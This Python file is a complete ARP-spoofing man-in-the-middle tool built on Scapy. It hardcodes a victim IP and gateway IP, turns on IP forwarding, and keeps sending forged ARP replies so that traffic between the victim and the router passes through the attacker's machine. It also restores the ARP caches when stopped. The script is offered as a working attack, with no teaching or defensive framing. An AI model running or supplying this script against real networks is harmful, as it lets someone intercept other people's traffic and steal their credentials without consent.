from scapy.all import *
import sys
import os
import time

#interface = input("[*] Enter Desired Interface: ")
#victimIP = input("[*] Enter Victim IP: ")
#gateIP = input("[*] Enter Router IP: ")
interface = "eth0"
victimIP= "192.168.0.14"
gateIP = "192.168.0.1"

print("\n[*] Turning on  IP Forwarding...\n")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def get_mac(IP):
	conf.verb = 0
	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
	for snd,rcv in ans:
		return rcv.sprintf(r"%Ether.src%")

def reARP():

	print("\n[*] Re arping targets...")
	victimMAC = get_mac(victimIP)
	gateMAC = get_mac(gateIP)
	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
	print("[*] Turning Off IP Forwarding...")
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	print("[*] Killing attack...")
	sys.exit(1)

def trick(gm, vm):
	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm))
	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))

def mitm():
	try:
		victimMAC = get_mac(victimIP)
	except Exception:
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		print("[!] Victim MAC Address not found...")
		print("[!] Quiting...")
		sys.exit(1)
	try:
		gateMAC = get_mac(gateIP)
		print(gateMAC)
	except Exception:
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		print("[!] Couldn't Find Gateway MAC Address")
		print("[!] Quiting...")
		sys.exit(1)
	print("[*] Targets are being poisoned...")
	while True:
		try:
			trick(gateMAC, victimMAC)
			time.sleep(.2)
		except KeyboardInterrupt:
			reARP()
			break
mitm()
